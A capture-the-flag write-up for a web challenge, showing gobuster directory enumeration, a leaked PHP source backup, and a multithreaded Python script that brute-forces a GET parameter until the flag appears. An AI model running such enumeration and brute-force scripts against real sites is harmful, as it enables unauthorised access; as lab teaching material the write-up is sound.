# Web Recon \& Enumeration Not So Random



First of all we have the site: http://ctf-06.security.cs.pub.ro:8000/ 

'Nothing to see here' which led me to a commonlist to see if there are hidden endpoints/files/directories with gobuster an instrument of type brute-force:
gobuster dir -u http://ctf-06.security.cs.pub.ro:8000/ -w ~/common.txt


/.hta.html            (Status: 403) [Size: 292]
/.hta                 (Status: 403) [Size: 292]
/.hta.php             (Status: 403) [Size: 292]
/.htaccess.txt        (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 292]
/.hta.bak             (Status: 403) [Size: 292]
/.htaccess.php        (Status: 403) [Size: 292]
/.hta.txt             (Status: 403) [Size: 292]
/.htpasswd.php        (Status: 403) [Size: 292]
/.htpasswd.html       (Status: 403) [Size: 292]
/.htaccess.bak        (Status: 403) [Size: 292]
/.htaccess.html       (Status: 403) [Size: 292]
/.htpasswd.txt        (Status: 403) [Size: 292]
/.htpasswd.bak        (Status: 403) [Size: 292]
/index.php            (Status: 200) [Size: 19]
/index.php            (Status: 200) [Size: 19]
/server-status        (Status: 403) [Size: 292]
/source.bak           (Status: 200) [Size: 110]

The interesting part is source.bak and index.php: 
We curl: 

vladpiriia@Vlads-MacBook-Air ~ % curl http://ctf-06.security.cs.pub.ro:8000/source.bak
if (isset($_GET['random_numberrr']) && intval($_GET['random_numberrr']) === $random_number) {
    echo $flag;
}%

This means that server verifies if we send a GET parameter named random_numberrr then compares that with a secret value $random_number and then if they are equal we are shown the flag.

But : GET http://ctf-06.security.cs.pub.ro:8000/source.bak?random_numberrr=12345 Source.bak este is a statice file, the server doesn't understand that PHP code, it shows as text, it doesn't run it so we need to modify it to have a script for : http://ctf-06.security.cs.pub.ro:8000/index.php?random_numberrr=12345.

```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://ctf-06.security.cs.pub.ro:8000/index.php"

def check_number(num):
    try:
        r = requests.get(url, params={'random_numberrr': num}, timeout=3)
        if "SSS{" in r.text:
            return f"\nFlag {num}: {r.text.strip()}"
        else:
            print(f"[-] Testat: {num}", flush=True)
    except requests.RequestException:
        print(f"[!] Eroare la: {num}", flush=True)
    return None

def brute_force_multi(start=20001, end=99999, threads=30):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_number, i) for i in range(start, end + 1)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)
                executor.shutdown(wait=False, cancel_futures=True)
                break

if __name__ == "__main__":
    brute_force_multi()
```


So then we find the flag at the number 49 999: Flag 49999: SSS{random_can_sometimes_be_predictable}.

